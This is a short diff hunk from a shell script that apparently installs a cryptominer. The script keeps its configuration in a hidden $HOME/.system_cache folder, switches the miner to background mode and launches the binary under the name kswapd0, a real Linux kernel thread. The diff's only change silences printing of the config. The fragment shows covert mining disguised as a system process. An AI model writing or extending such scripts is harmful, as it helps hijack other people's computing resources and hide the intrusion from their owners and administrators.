@@ -354,7 +354,7 @@ sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_c
 
 cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
-cat $HOME/.system_cache/config.json
+#cat $HOME/.system_cache/config.json
 
 # Run kswapd0 if no other process with the specific configuration is running
 if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
